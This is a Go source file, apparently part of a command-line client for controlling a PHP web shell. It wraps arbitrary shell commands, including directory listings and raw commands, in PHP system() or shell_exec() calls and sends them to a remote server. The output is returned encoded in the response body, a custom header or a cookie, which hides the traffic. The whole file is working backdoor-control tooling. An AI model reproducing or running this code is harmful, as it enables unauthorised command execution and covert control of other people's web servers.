package command

import (
	"fmt"
	"net/http"
	"network"
	"normalizer"
	"strings"
	"worker"

	"github.com/urfave/cli"
)

var CMD = COMMAND{}

type COMMAND struct {
	_method  int
	_context string
}

func (c *COMMAND) Setup() {
	fmt.Println("in progress")
}

func HandleNotConnected() {
	fmt.Println("You haven't setup the required information, please refer to srv config")
}

func (c *COMMAND) getSystemCMD(cmd, r string) string {
	return "ob_start();system('" + cmd + "');$" + r + "=ob_get_contents();ob_end_clean();"
}

func (c *COMMAND) getShellExecCMD(cmd, r string) string {
	return "$" + r + "=shell_exec('" + cmd + "');"
}

func (c *COMMAND) createCMD(cmd *string, r string) {
	var contexter string

	if c._context != "" {
		contexter = "cd " + c._context + " && "
	}

	shellCMD := contexter + *cmd

	if c._method == 0 {
		shellCMD = c.getSystemCMD(shellCMD, r)
	} else if c._method == 1 {
		shellCMD = c.getShellExecCMD(shellCMD, r)
	}

	*cmd = shellCMD
}

func (c *COMMAND) getReturn() string {
	var response string

	m := network.NET.GetMethod()
	p := network.NET.GetParameter()

	if m == 0 || m == 1 {
		response = "echo(" + normalizer.PHPEncode("$r") + ");exit();"
	} else if m == 2 {
		response = "header('" + p + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
	} else if m == 3 {
		response = "setcookie('" + p + "', " + normalizer.PHPEncode("$r") + ");exit();"
	}

	return response
}

func (cmd *COMMAND) Ls(c *cli.Context) {
	if !network.NET.IsSetup() {
		HandleNotConnected()
		return
	}

	if c.Bool("raw") {
		ls := "ls " + strings.Join(c.Args(), " ")
		cmd.Raw(ls)

		return
	}

	var context string

	if len(c.Args()) > 0 {
		context = "cd " + c.Args().Get(0) + " && "
	}

	lsFolder := context + "ls -ld */"
	lsFile := context + "ls -lp | grep -v /"

	cmd.createCMD(&lsFolder, "a")
	cmd.createCMD(&lsFile, "b")

	ls := lsFolder + lsFile + "$r=json_encode(array($a, $b));" + cmd.getReturn()

	network.NET.Send(ls, lsEnd)
}

func lsEnd(r *http.Response) {
	buffer := worker.GetBody(r)
	base64 := string(buffer)
	body := normalizer.Decode(base64)

	fmt.Println(body)
}

func (cmd *COMMAND) Raw(a string) {
	cmd.createCMD(&a, "r")
	a = a + cmd.getReturn()

	network.NET.Send(a, rawEnd)
}

func rawEnd(r *http.Response) {
	buffer := worker.GetBody(r)
	base64 := string(buffer)
	body := normalizer.Decode(base64)

	fmt.Println(body)
}
